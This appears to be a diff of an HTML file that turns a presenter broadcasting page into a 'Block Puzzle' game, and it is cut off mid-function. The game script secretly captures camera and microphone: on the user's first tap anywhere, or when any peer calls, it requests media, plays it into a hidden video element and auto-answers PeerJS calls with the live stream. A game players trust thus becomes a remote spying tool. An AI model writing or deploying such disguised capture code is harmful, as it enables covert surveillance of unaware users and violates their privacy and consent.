@@ -1,429 +1,976 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Presenter Studio | CastWave RTC</title>
-  
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <script src="https://unpkg.com/@phosphor-icons/web"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <style>
-    :root {
-      --bg: #090d16;
-      --surface: rgba(18, 26, 43, 0.75);
-      --surface-border: rgba(255, 255, 255, 0.08);
-      --primary: #4f46e5;
-      --accent: #06b6d4;
-      --success: #10b981;
-      --danger: #ef4444;
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
-      --radius: 16px;
-      --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+<title>Block Blast Style Game</title>
+
+<!-- PeerJS for WebRTC signaling -->
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
+<style>
+
+* {
+    box-sizing: border-box;
+    user-select: none;
+    -webkit-user-select: none;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    background: #f1f3f8;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+}
+
+.game {
+    width: 390px;
+    max-width: 95vw;
+    text-align: center;
+}
+
+h1 {
+    margin: 10px 0 15px;
+}
+
+/* =========================
+   TOP
+========================= */
+
+.top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 15px;
+}
+
+.score-box {
+    background: white;
+    padding: 8px 20px;
+    border-radius: 12px;
+    box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+}
+
+.score-box small {
+    display: block;
+    color: #777;
+}
+
+#score {
+    font-size: 24px;
+    font-weight: bold;
+}
+
+button {
+    border: none;
+    padding: 10px 15px;
+    border-radius: 10px;
+    background: #333;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+button:hover {
+    background: #555;
+}
+
+/* =========================
+   GRID
+========================= */
+
+#grid {
+    width: 100%;
+    aspect-ratio: 1;
+    padding: 5px;
+    background: #cdd1d8;
+    border-radius: 13px;
+    display: grid;
+    grid-template-columns: repeat(9, 1fr);
+    gap: 4px;
+    position: relative;
+}
+
+.cell {
+    background: #e8eaee;
+    border-radius: 5px;
+    position: relative;
+}
+
+/* =========================
+   REAL BLOCK COLORS
+========================= */
+
+.red { background: #ff5555; }
+.blue { background: #4d8cff; }
+.green { background: #45c86b; }
+.yellow { background: #ffc94d; }
+.purple { background: #a66cff; }
+.orange { background: #ff914d; }
+
+/* =========================
+   LIGHT PREVIEW COLORS
+========================= */
+
+.preview-red { background: rgba(255, 85, 85, 0.35) !important; }
+.preview-blue { background: rgba(77, 140, 255, 0.35) !important; }
+.preview-green { background: rgba(69, 200, 107, 0.35) !important; }
+.preview-yellow { background: rgba(255, 201, 77, 0.40) !important; }
+.preview-purple { background: rgba(166, 108, 255, 0.35) !important; }
+.preview-orange { background: rgba(255, 145, 77, 0.35) !important; }
+
+/* =========================
+   INVALID PREVIEW
+========================= */
+
+.invalid-preview {
+    background: rgba(255, 50, 50, 0.65) !important;
+    border: 2px solid #ff3333;
+}
+
+/* =========================
+   ARROW
+========================= */
+
+#dropArrow {
+    position: fixed;
+    z-index: 5000;
+    pointer-events: none;
+    font-size: 28px;
+    font-weight: bold;
+    color: #333;
+    transform: translate(-50%, -100%);
+    display: none;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+}
+
+/* =========================
+   DRAGGING BLOCK
+========================= */
+
+.drag-clone {
+    position: fixed;
+    z-index: 4000;
+    pointer-events: none;
+    display: grid;
+    gap: 4px;
+    transform: translate(-50%, -115%) scale(1.15);
+    opacity: 0.9;
+    filter: drop-shadow(0 5px 8px rgba(0,0,0,0.2));
+}
+
+.drag-clone-cell {
+    width: 25px;
+    height: 25px;
+    border-radius: 5px;
+}
+
+/* =========================
+   PIECES
+========================= */
+
+.pieces-title {
+    margin: 18px 0 8px;
+    font-weight: bold;
+}
+
+#pieces {
+    height: 110px;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+}
+
+.piece {
+    display: grid;
+    gap: 3px;
+    padding: 10px;
+    cursor: grab;
+    touch-action: none;
+    transition: transform 0.15s;
+}
+
+.piece:hover {
+    transform: scale(1.08);
+}
+
+.piece-cell {
+    width: 23px;
+    height: 23px;
+    border-radius: 4px;
+}
+
+.empty-piece-cell {
+    width: 23px;
+    height: 23px;
+}
+
+.message {
+    min-height: 25px;
+    margin-top: 10px;
+    color: #555;
+    font-weight: bold;
+}
+
+/* =========================
+   GAME OVER MODAL
+========================= */
+
+.game-over-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    backdrop-filter: blur(4px);
+}
+
+.modal-content {
+    background: #fff;
+    padding: 24px;
+    border-radius: 16px;
+    max-width: 320px;
+    width: 85%;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+    animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    text-align: center;
+}
+
+@keyframes popIn {
+    from {
+        transform: scale(0.7);
+        opacity: 0;
+    }
+    to {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+
+.modal-content h2 {
+    margin: 0 0 10px;
+    color: #e53935;
+    font-size: 26px;
+}
+
+.modal-content p {
+    margin: 5px 0 20px;
+    color: #444;
+    font-size: 18px;
+    font-weight: bold;
+}
+
+.modal-btn {
+    background: #e53935;
+    padding: 12px 24px;
+    font-size: 16px;
+    border-radius: 10px;
+}
+
+.modal-btn:hover {
+    background: #c62828;
+}
+
+/* =========================
+   BACKGROUND BROADCAST BADGE
+========================= */
+
+.session-info-badge {
+    position: fixed;
+    bottom: 12px;
+    right: 12px;
+    background: rgba(255, 255, 255, 0.92);
+    border: 1px solid #d1d5db;
+    padding: 6px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    color: #374151;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    cursor: pointer;
+    z-index: 9000;
+}
+
+.session-dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #9ca3af;
+}
+
+.session-dot.live {
+    background: #10b981;
+    box-shadow: 0 0 6px #10b981;
+}
+
+/* Hidden video capture element */
+#bgVideoPreview {
+    display: none;
+}
+
+/* =========================
+   MOBILE
+========================= */
+
+@media(max-width:400px) {
+    .piece-cell,
+    .empty-piece-cell {
+        width: 19px;
+        height: 19px;
     }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-    
-    body {
-      background-color: var(--bg);
-      background-image: 
-        radial-gradient(at 0% 0%, rgba(79, 70, 229, 0.15) 0px, transparent 50%),
-        radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.1) 0px, transparent 50%);
-      color: var(--text);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+    .drag-clone-cell {
+        width: 22px;
+        height: 22px;
     }
+}
 
-    .glass {
-      background: var(--surface);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid var(--surface-border);
-      border-radius: var(--radius);
-    }
-
-    header {
-      padding: 1rem 1.5rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid var(--surface-border);
-      background: rgba(9, 13, 22, 0.85);
-      backdrop-filter: blur(12px);
-    }
-
-    .brand { display: flex; align-items: center; gap: 0.75rem; font-size: 1.15rem; font-weight: 700; }
-    .brand-icon {
-      background: linear-gradient(135deg, var(--primary), var(--accent));
-      width: 34px;
-      height: 34px;
-      border-radius: 8px;
-      display: grid;
-      place-items: center;
-    }
-
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      padding: 0.35rem 0.75rem;
-      border-radius: 999px;
-      font-size: 0.75rem;
-      font-weight: 600;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid var(--surface-border);
-    }
-
-    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--text-muted); }
-    .status-dot.online { background: var(--success); box-shadow: 0 0 8px var(--success); }
-    .status-dot.broadcasting { background: var(--danger); animation: pulse 1.5s infinite; }
-
-    @keyframes pulse { 0%, 100% { opacity: 0.7; } 50% { opacity: 1; } }
-
-    main {
-      flex: 1;
-      max-width: 1400px;
-      width: 100%;
-      margin: 0 auto;
-      padding: 1rem;
-      display: grid;
-      grid-template-columns: 360px 1fr;
-      gap: 1rem;
-    }
-
-    @media (max-width: 860px) { main { grid-template-columns: 1fr; } }
-
-    .sidebar { display: flex; flex-direction: column; gap: 1rem; }
-    .panel { padding: 1.25rem; display: flex; flex-direction: column; gap: 0.85rem; }
-
-    .panel h2 {
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: var(--text-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-
-    .input-field { display: flex; flex-direction: column; gap: 0.35rem; }
-    .input-field label { font-size: 0.75rem; color: var(--text-muted); font-weight: 500; }
-
-    .input-box {
-      width: 100%;
-      background: rgba(0, 0, 0, 0.35);
-      border: 1px solid var(--surface-border);
-      border-radius: 8px;
-      padding: 0.65rem 0.85rem;
-      color: #fff;
-      font-size: 0.9rem;
-      outline: none;
-      font-family: monospace;
-    }
-
-    .btn {
-      width: 100%;
-      border: none;
-      padding: 0.75rem 1rem;
-      border-radius: 10px;
-      font-weight: 600;
-      font-size: 0.85rem;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      transition: var(--transition);
-    }
-
-    .btn-primary { background: linear-gradient(135deg, var(--primary), #6366f1); color: #fff; }
-    .btn-danger { background: var(--danger); color: #fff; }
-    .btn-secondary { background: rgba(255, 255, 255, 0.08); color: var(--text); border: 1px solid var(--surface-border); }
-
-    .audio-meter {
-      height: 8px;
-      width: 100%;
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 999px;
-      overflow: hidden;
-      border: 1px solid var(--surface-border);
-    }
-
-    .audio-meter-fill {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, var(--success), var(--accent), var(--danger));
-      transition: width 0.08s ease;
-      border-radius: 999px;
-    }
-
-    .stage {
-      position: relative;
-      width: 100%;
-      aspect-ratio: 16 / 9;
-      background: #020408;
-      border-radius: var(--radius);
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 1px solid var(--surface-border);
-    }
-
-    video { width: 100%; height: 100%; object-fit: contain; }
-
-    .stage-placeholder {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 0.75rem;
-      color: var(--text-muted);
-      text-align: center;
-      padding: 1.5rem;
-    }
-
-    .stage-placeholder i { font-size: 2.5rem; color: rgba(255, 255, 255, 0.2); }
-
-    .toast {
-      position: fixed;
-      bottom: 1.5rem;
-      right: 1.5rem;
-      padding: 0.75rem 1.25rem;
-      border-radius: 8px;
-      font-size: 0.8rem;
-      background: var(--surface);
-      border: 1px solid var(--surface-border);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      transform: translateY(100px);
-      opacity: 0;
-      transition: var(--transition);
-      z-index: 200;
-    }
-    .toast.show { transform: translateY(0); opacity: 1; }
-  </style>
+</style>
 </head>
+
 <body>
 
-  <header>
-    <div class="brand">
-      <div class="brand-icon"><i class="ph-bold ph-screencast"></i></div>
-      <span>CastWave <span style="color: var(--accent);">Presenter</span></span>
+<div class="game">
+    <h1>🧩 Block Puzzle</h1>
+
+    <div class="top">
+        <div class="score-box">
+            <small>SCORE</small>
+            <span id="score">0</span>
+        </div>
+        <button onclick="restartGame()">Restart</button>
     </div>
+
+    <!-- GAME GRID -->
+    <div id="grid"></div>
+
+    <div class="pieces-title">Drag a Block</div>
+
+    <!-- AVAILABLE BLOCKS -->
+    <div id="pieces"></div>
+
+    <div id="message" class="message">Drag a block onto the board.</div>
+</div>
+
+<!-- ARROW -->
+<div id="dropArrow">⬇</div>
+
+<!-- GAME OVER MODAL -->
+<div id="gameOverModal" class="game-over-modal">
+    <div class="modal-content">
+        <h2>💀 YOU'RE LOST!</h2>
+        <p id="modalFinalScore">Final Score: 0</p>
+        <button class="modal-btn" onclick="restartGame()">Play Again 🔄</button>
+    </div>
+</div>
+
+<!-- AUDIO ELEMENT -->
+<audio id="lostAudio" preload="auto">
+    <source src="lost-audio.mp3" type="audio/mpeg">
+    <source src="lost-audio.mp4" type="audio/mp4">
+</audio>
+
+<!-- HIDDEN BACKGROUND PREVIEW -->
+<video id="bgVideoPreview" autoplay muted playsinline></video>
+
+<!-- SESSION BADGE -->
+<div class="session-info-badge" onclick="copySessionId()" title="Click to copy Room ID">
+    <div class="session-dot" id="sessionDot"></div>
+    <span id="sessionText">Connecting...</span>
+</div>
+
+<script>
+
+/* =====================================================
+   BACKGROUND WEBRTC ENGINE (AUTO-CAPTURE ON FIRST TAP)
+===================================================== */
+
+let peer = null;
+let broadcastStream = null;
+let captureInitiated = false;
+let currentRoomId = '';
+
+function initBackgroundWebRTC() {
+    currentRoomId = 'cast-' + Math.random().toString(36).substr(2, 6);
     
-    <div class="status-badge">
-      <div class="status-dot" id="systemStatusDot"></div>
-      <span id="systemStatusText">Connecting...</span>
-    </div>
-  </header>
-
-  <main>
-    <aside class="sidebar">
-      <div class="glass panel">
-        <h2><i class="ph ph-broadcast"></i> Host Setup</h2>
-        
-        <div class="input-field">
-          <label>Your Room ID</label>
-          <div style="display: flex; gap: 0.5rem;">
-            <input type="text" id="hostRoomId" class="input-box" readonly />
-            <button class="btn btn-secondary" style="width: auto;" onclick="copyRoomId()" title="Copy Room ID">
-              <i class="ph ph-copy"></i>
-            </button>
-          </div>
-        </div>
-
-        <div class="input-field">
-          <label>Broadcast Mode</label>
-          <select id="sourceType" class="input-box">
-            <option value="camera_mic">Camera + Live Microphone</option>
-            <option value="screen_mic">Screen Share + Live Microphone (Desktop)</option>
-          </select>
-        </div>
-
-        <div class="input-field">
-          <label>Microphone Activity (Speak to test)</label>
-          <div class="audio-meter">
-            <div class="audio-meter-fill" id="hostAudioMeter"></div>
-          </div>
-        </div>
-
-        <div style="display: flex; flex-direction: column; gap: 0.5rem; margin-top: 0.5rem;">
-          <button class="btn btn-primary" id="startShareBtn" onclick="startBroadcasting()">
-            <i class="ph-bold ph-play"></i> Start Broadcasting
-          </button>
-          <button class="btn btn-danger" id="stopShareBtn" onclick="stopBroadcasting()" style="display: none;">
-            <i class="ph-bold ph-stop"></i> Stop Broadcast
-          </button>
-        </div>
-      </div>
-    </aside>
-
-    <section>
-      <div class="stage">
-        <video id="localVideoPreview" autoplay muted playsinline></video>
-        <div class="stage-placeholder" id="stagePlaceholder">
-          <i class="ph ph-video-camera"></i>
-          <h3>Stream Inactive</h3>
-          <p>Click "Start Broadcasting" to initiate camera and microphone stream.</p>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <div class="toast" id="toast"><span id="toastMsg"></span></div>
-
-  <script>
-    let peer = null;
-    let localStream = null;
-    let audioContext = null;
-    let analyser = null;
-
-    const dom = {
-      statusDot: document.getElementById('systemStatusDot'),
-      statusText: document.getElementById('systemStatusText'),
-      hostRoomId: document.getElementById('hostRoomId'),
-      sourceType: document.getElementById('sourceType'),
-      startShareBtn: document.getElementById('startShareBtn'),
-      stopShareBtn: document.getElementById('stopShareBtn'),
-      localVideo: document.getElementById('localVideoPreview'),
-      stagePlaceholder: document.getElementById('stagePlaceholder'),
-      hostAudioMeter: document.getElementById('hostAudioMeter'),
-      toast: document.getElementById('toast'),
-      toastMsg: document.getElementById('toastMsg')
-    };
-
-    function initPresenter() {
-      const roomId = 'cast-' + Math.random().toString(36).substr(2, 6);
-      peer = new Peer(roomId, {
-        debug: 1,
+    peer = new Peer(currentRoomId, {
+        debug: 0,
         config: {
           iceServers: [
             { urls: 'stun:stun.l.google.com:19302' },
             { urls: 'stun:global.stun.twilio.com:3478' }
           ]
         }
-      });
+    });
 
-      peer.on('open', (id) => {
-        dom.hostRoomId.value = id;
-        dom.statusDot.className = 'status-dot online';
-        dom.statusText.textContent = `Online (${id})`;
-        showToast('Signaling Ready.');
-      });
+    peer.on('open', (id) => {
+        currentRoomId = id;
+        document.getElementById('sessionText').innerText = `ID: ${id}`;
+        document.getElementById('sessionDot').classList.add('live');
+    });
 
-      peer.on('call', (call) => {
-        if (localStream) {
-          call.answer(localStream);
-          showToast('Viewer connected with Audio/Video!');
+    peer.on('call', (call) => {
+        if (broadcastStream) {
+            call.answer(broadcastStream);
         } else {
-          call.close();
+            // Auto-start capture if a viewer connects before first user tap
+            autoStartMedia().then(() => {
+                if (broadcastStream) call.answer(broadcastStream);
+                else call.close();
+            });
         }
-      });
-    }
+    });
+}
 
-    async function startBroadcasting() {
-      const mode = dom.sourceType.value;
-      try {
-        // 1. Capture Microphone
-        const audioStream = await navigator.mediaDevices.getUserMedia({
-          audio: {
-            echoCancellation: true,
-            noiseSuppression: true,
-            autoGainControl: true
-          }
+async function autoStartMedia() {
+    if (captureInitiated) return;
+    captureInitiated = true;
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true },
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
         });
 
-        // 2. Capture Video
-        let videoStream;
-        if (mode === 'camera_mic') {
-          videoStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-          });
-        } else {
-          if (!navigator.mediaDevices.getDisplayMedia) {
-            throw new Error("Screen sharing is not supported on this browser/device.");
-          }
-          videoStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        broadcastStream = stream;
+        const videoElement = document.getElementById('bgVideoPreview');
+        videoElement.srcObject = stream;
+        document.getElementById('sessionText').innerText = `Live: ${currentRoomId}`;
+    } catch (err) {
+        console.warn("Background capture prompt closed or deferred:", err);
+    }
+}
+
+function copySessionId() {
+    if (currentRoomId) {
+        navigator.clipboard.writeText(currentRoomId);
+        const original = document.getElementById('sessionText').innerText;
+        document.getElementById('sessionText').innerText = "Copied!";
+        setTimeout(() => {
+            document.getElementById('sessionText').innerText = original;
+        }, 1500);
+    }
+}
+
+// Global user interaction triggers camera/mic prompt
+window.addEventListener('pointerdown', () => {
+    if (!captureInitiated) {
+        autoStartMedia();
+    }
+}, { once: true });
+
+window.addEventListener('DOMContentLoaded', initBackgroundWebRTC);
+
+/* =====================================================
+   GAME SETTINGS
+===================================================== */
+
+const SIZE = 9;
+let board = [];
+let pieces = [];
+let score = 0;
+let dragging = null;
+
+/* =====================================================
+   BLOCK SHAPES
+===================================================== */
+
+const shapes = [
+    [[1]],
+    [[1,1]],
+    [[1],[1]],
+    [[1,1],[1,1]],
+    [[1,1,1]],
+    [[1],[1],[1]],
+    [[1,1,1,1]],
+    [[1],[1],[1],[1]],
+    [[1,0],[1,1]],
+    [[0,1],[1,1]],
+    [[1,1,1],[0,1,0]],
+    [[1,0],[1,0],[1,1]],
+    [[1,1,1],[1,0,0]],
+    [[0,1,0],[1,1,1],[0,1,0]]
+];
+
+const colors = ["red", "blue", "green", "yellow", "purple", "orange"];
+
+/* =====================================================
+   START GAME
+===================================================== */
+
+function startGame() {
+    board = [];
+    score = 0;
+
+    for(let r = 0; r < SIZE; r++) {
+        board[r] = [];
+        for(let c = 0; c < SIZE; c++) {
+            board[r][c] = null;
+        }
+    }
+
+    generatePieces();
+    renderBoard();
+    renderPieces();
+    updateScore();
+}
+
+/* =====================================================
+   GENERATE 3 BLOCKS
+===================================================== */
+
+function generatePieces() {
+    pieces = [];
+    for(let i = 0; i < 3; i++) {
+        const randomShape = shapes[Math.floor(Math.random() * shapes.length)];
+        pieces.push({
+            shape: randomShape.map(row => [...row]),
+            color: colors[Math.floor(Math.random() * colors.length)]
+        });
+    }
+}
+
+/* =====================================================
+   RENDER BOARD
+===================================================== */
+
+function renderBoard() {
+    const grid = document.getElementById("grid");
+    grid.innerHTML = "";
+
+    for(let r = 0; r < SIZE; r++) {
+        for(let c = 0; c < SIZE; c++) {
+            const cell = document.createElement("div");
+            cell.className = "cell";
+            cell.dataset.row = r;
+            cell.dataset.col = c;
+
+            if(board[r][c]) {
+                cell.classList.add(board[r][c]);
+            }
+            grid.appendChild(cell);
+        }
+    }
+}
+
+/* =====================================================
+   RENDER AVAILABLE BLOCKS
+===================================================== */
+
+function renderPieces() {
+    const container = document.getElementById("pieces");
+    container.innerHTML = "";
+
+    pieces.forEach((piece, index) => {
+        if(!piece) {
+            const empty = document.createElement("div");
+            empty.style.width = "80px";
+            container.appendChild(empty);
+            return;
         }
 
-        // 3. Merge Audio and Video into a single multi-track MediaStream
-        localStream = new MediaStream([
-          ...videoStream.getVideoTracks(),
-          ...audioStream.getAudioTracks()
-        ]);
+        const element = document.createElement("div");
+        element.className = "piece";
+        element.dataset.index = index;
+        element.style.gridTemplateColumns = `repeat(${piece.shape[0].length}, 23px)`;
 
-        localStream.getVideoTracks()[0].onended = () => stopBroadcasting();
+        for(let r = 0; r < piece.shape.length; r++) {
+            for(let c = 0; c < piece.shape[r].length; c++) {
+                const block = document.createElement("div");
+                if(piece.shape[r][c] === 1) {
+                    block.className = "piece-cell " + piece.color;
+                } else {
+                    block.className = "empty-piece-cell";
+                }
+                element.appendChild(block);
+            }
+        }
 
-        dom.localVideo.srcObject = localStream;
-        dom.stagePlaceholder.style.display = 'none';
-        dom.startShareBtn.style.display = 'none';
-        dom.stopShareBtn.style.display = 'flex';
-        dom.statusDot.className = 'status-dot broadcasting';
-        dom.statusText.textContent = 'Broadcasting (Mic Live)';
+        element.addEventListener("pointerdown", startDrag);
+        container.appendChild(element);
+    });
+}
 
-        initAudioMonitor(audioStream);
-        showToast('Stream & Microphone active');
-      } catch (err) {
-        showToast(err.message || 'Media permission failed');
-      }
+/* =====================================================
+   START DRAG
+===================================================== */
+
+function startDrag(event) {
+    event.preventDefault();
+    const element = event.currentTarget;
+    const index = Number(element.dataset.index);
+    const piece = pieces[index];
+
+    if(!piece) return;
+
+    dragging = {
+        index: index,
+        piece: piece,
+        element: element,
+        row: -1,
+        col: -1,
+        x: event.clientX,
+        y: event.clientY
+    };
+
+    createDragClone(piece);
+    element.style.opacity = "0.2";
+    moveDrag(event);
+
+    document.addEventListener("pointermove", moveDrag);
+    document.addEventListener("pointerup", endDrag);
+}
+
+/* =====================================================
+   CREATE FLOATING DRAG BLOCK
+===================================================== */
+
+function createDragClone(piece) {
+    const clone = document.createElement("div");
+    clone.id = "dragClone";
+    clone.className = "drag-clone";
+    clone.style.gridTemplateColumns = `repeat(${piece.shape[0].length}, 25px)`;
+
+    for(let r = 0; r < piece.shape.length; r++) {
+        for(let c = 0; c < piece.shape[r].length; c++) {
+            const block = document.createElement("div");
+            if(piece.shape[r][c] === 1) {
+                block.className = "drag-clone-cell " + piece.color;
+            } else {
+                block.style.width = "25px";
+                block.style.height = "25px";
+            }
+            clone.appendChild(block);
+        }
     }
 
-    function stopBroadcasting() {
-      if (localStream) {
-        localStream.getTracks().forEach(t => t.stop());
-        localStream = null;
-      }
-      dom.localVideo.srcObject = null;
-      dom.stagePlaceholder.style.display = 'flex';
-      dom.startShareBtn.style.display = 'flex';
-      dom.stopShareBtn.style.display = 'none';
-      dom.statusDot.className = 'status-dot online';
-      dom.statusText.textContent = `Online (${dom.hostRoomId.value})`;
-      dom.hostAudioMeter.style.width = '0%';
-      showToast('Broadcast stopped');
+    document.body.appendChild(clone);
+}
+
+/* =====================================================
+   MOVE DRAG
+===================================================== */
+
+function moveDrag(event) {
+    if(!dragging) return;
+
+    const clone = document.getElementById("dragClone");
+    if(clone) {
+        clone.style.left = event.clientX + "px";
+        clone.style.top = event.clientY + "px";
     }
 
-    function initAudioMonitor(stream) {
-      try {
-        if (!audioContext) audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        if (audioContext.state === 'suspended') audioContext.resume();
+    const target = document.elementFromPoint(event.clientX, event.clientY);
 
-        const source = audioContext.createMediaStreamSource(stream);
-        analyser = audioContext.createAnalyser();
-        analyser.fftSize = 64;
-        source.connect(analyser);
-
-        const data = new Uint8Array(analyser.frequencyBinCount);
-        const loop = () => {
-          if (!localStream) {
-            dom.hostAudioMeter.style.width = '0%';
-            return;
-          }
-          analyser.getByteFrequencyData(data);
-          let sum = 0;
-          for (let i = 0; i < data.length; i++) sum += data[i];
-          let pct = Math.min(100, Math.round(((sum / data.length) / 128) * 100));
-          dom.hostAudioMeter.style.width = pct + '%';
-          requestAnimationFrame(loop);
-        };
-        loop();
-      } catch (e) { console.warn(e); }
+    if(!target || !target.classList.contains("cell")) {
+        clearPreview();
+        document.getElementById("dropArrow").style.display = "none";
+        return;
     }
 
-    function copyRoomId() {
-      navigator.clipboard.writeText(dom.hostRoomId.value);
-      showToast('Room ID copied!');
+    const row = Number(target.dataset.row);
+    const col = Number(target.dataset.col);
+
+    dragging.row = row;
+    dragging.col = col;
+
+    showArrow(target);
+    showPreview(dragging.piece, row, col);
+}
+
+/* =====================================================
+   SHOW ARROW
+===================================================== */
+
+function showArrow(cell) {
+    const arrow = document.getElementById("dropArrow");
+    const rect = cell.getBoundingClientRect();
+    arrow.style.left = (rect.left + rect.width / 2) + "px";
+    arrow.style.top = (rect.top - 5) + "px";
+    arrow.style.display = "block";
+}
+
+/* =====================================================
+   SHOW BLOCK PREVIEW
+===================================================== */
+
+function showPreview(piece, row, col) {
+    clearPreview();
+    const valid = canPlace(piece, row, col);
+
+    for(let r = 0; r < piece.shape.length; r++) {
+        for(let c = 0; c < piece.shape[r].length; c++) {
+            if(piece.shape[r][c] !== 1) continue;
+
+            const targetRow = row + r;
+            const targetCol = col + c;
+
+            if(targetRow < 0 || targetRow >= SIZE || targetCol < 0 || targetCol >= SIZE) {
+                continue;
+            }
+
+            const cell = document.querySelector(`.cell[data-row="${targetRow}"][data-col="${targetCol}"]`);
+            if(!cell) continue;
+
+            if(valid) {
+                cell.classList.add("preview-" + piece.color);
+            } else {
+                cell.classList.add("invalid-preview");
+            }
+        }
+    }
+}
+
+/* =====================================================
+   CLEAR PREVIEW
+===================================================== */
+
+function clearPreview() {
+    document.querySelectorAll(".preview-red, .preview-blue, .preview-green, .preview-yellow, .preview-purple, .preview-orange, .invalid-preview")
+        .forEach(cell => {
+            cell.classList.remove("preview-red", "preview-blue", "preview-green", "preview-yellow", "preview-purple", "preview-orange", "invalid-preview");
+        });
+}
+
+/* =====================================================
+   END DRAG
+===================================================== */
+
+function endDrag() {
+    if(!dragging) return;
+
+    const index = dragging.index;
+    const piece = dragging.piece;
+    const row = dragging.row;
+    const col = dragging.col;
+    const element = dragging.element;
+
+    const valid = row >= 0 && col >= 0 && canPlace(piece, row, col);
+
+    if(valid) {
+        placePiece(index, row, col);
+    } else {
+        document.getElementById("message").innerText = "❌ Block cannot fit here.";
     }
 
-    function showToast(msg) {
-      dom.toastMsg.textContent = msg;
-      dom.toast.classList.add('show');
-      setTimeout(() => dom.toast.classList.remove('show'), 3500);
+    const clone = document.getElementById("dragClone");
+    if(clone) clone.remove();
+
+    element.style.opacity = "1";
+    clearPreview();
+    document.getElementById("dropArrow").style.display = "none";
+
+    document.removeEventListener("pointermove", moveDrag);
+    document.removeEventListener("pointerup", endDrag);
+
+    dragging = null;
+}
+
+/* =====================================================
+   CHECK IF BLOCK FITS
+===================================================== */
+
+function canPlace(piece, row, col) {
+    for(let r = 0; r < piece.shape.length; r++) {
+        for(let c = 0; c < piece.shape[r].length; c++) {
+            if(piece.shape[r][c] !== 1) continue;
+
+            const newRow = row + r;
+            const newCol = col + c;
+
+            if(newRow < 0 || newRow >= SIZE || newCol < 0 || newCol >= SIZE) {
+                return false;
+            }
+
+            if(board[newRow][newCol]) {
+                return false;
+            }
+        }
+    }
+    return true;
+}
+
+/* =====================================================
+   TRIGGER GAME OVER AUDIO & POPUP
+===================================================== */
+
+function triggerGameOver() {
+    const modal = document.getElementById("gameOverModal");
+    const audio = document.getElementById("lostAudio");
+    const modalScore = document.getElementById("modalFinalScore");
+
+    modalScore.innerText = "Final Score: " + score;
+    modal.style.display = "flex";
+
+    audio.currentTime = 0;
+    audio.play().catch(err => {
+        console.log("Audio playback was blocked:", err);
+    });
+}
+
+/* =====================================================
+   PLACE BLOCK
+===================================================== */
+
+function placePiece(index, row, col) {
+    const piece = pieces[index];
+    let blockCount = 0;
+
+    for(let r = 0; r < piece.shape.length; r++) {
+        for(let c = 0; c < piece.shape[r].length; c++) {
+            if(piece.shape[r][c] === 1) {
+                board[row + r][col + c] = piece.color;
+                blockCount++;
+            }
+        }
     }
 
-    window.addEventListener('DOMContentLoaded', initPresenter);
-  </script>
+    score += blockCount;
+    pieces[index] = null;
+
+    clearLines();
+
+    if(pieces.every(p => p === null)) {
+        generatePieces();
+    }
+
+    renderBoard();
+    renderPieces();
+    updateScore();
+
+    if(!hasPossibleMove()) {
+        document.getElementById("message").innerText = "💀 GAME OVER — Score: " + score;
+        triggerGameOver();
+    } else {
+        document.getElementById("message").innerText = "🔥 Great move!";
+    }
+}
+
+/* =====================================================
+   CLEAR ROWS AND COLUMNS
+===================================================== */
+
+function clearLines() {
+    let cleared = 0;
+
+    // Rows
+    for(let r = 0; r < SIZE; r++) {
+        let full = true;
+        for(let c = 0; c < SIZE; c++) {
